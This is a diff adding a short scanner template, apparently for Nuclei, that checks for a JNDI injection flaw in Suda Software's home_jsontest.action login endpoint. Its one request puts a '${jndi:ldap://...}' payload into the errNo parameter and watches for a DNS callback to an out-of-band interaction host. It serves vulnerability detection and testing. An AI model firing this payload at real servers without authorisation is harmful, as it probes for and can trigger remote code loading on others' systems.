@@ -1,0 +1,20 @@
+id: poc-yaml-suda-software-home-jsontest-jnidi
+info:
+  name: Suda Software home_jsontest JNDI Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ldap-injection
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: GET
+    path:
+      - "/login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://{{reverse}}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
